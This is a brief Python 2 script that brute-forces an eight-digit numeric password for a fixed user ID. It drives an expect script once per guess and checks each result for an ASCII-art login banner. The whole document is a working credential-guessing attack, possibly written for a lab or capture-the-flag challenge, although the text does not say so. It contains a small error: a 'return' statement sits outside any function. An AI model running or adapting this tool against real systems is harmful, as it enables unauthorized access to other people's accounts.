#!/usr/bin/python
from subprocess import Popen, PIPE

def execute(username, passwd):
	process = Popen(["./single_test.exp", str(username), str(passwd)], stdout=PIPE)
	(output, err) = process.communicate()
	exit_code = process.wait()
	return "  _____             __    _      __   __" in output

for passwd in xrange(10000000, 99999999):
	if passwd % 1000 == 0:
		print "checking", passwd
	if execute(184731, passwd):
		print "pass", passwd
		return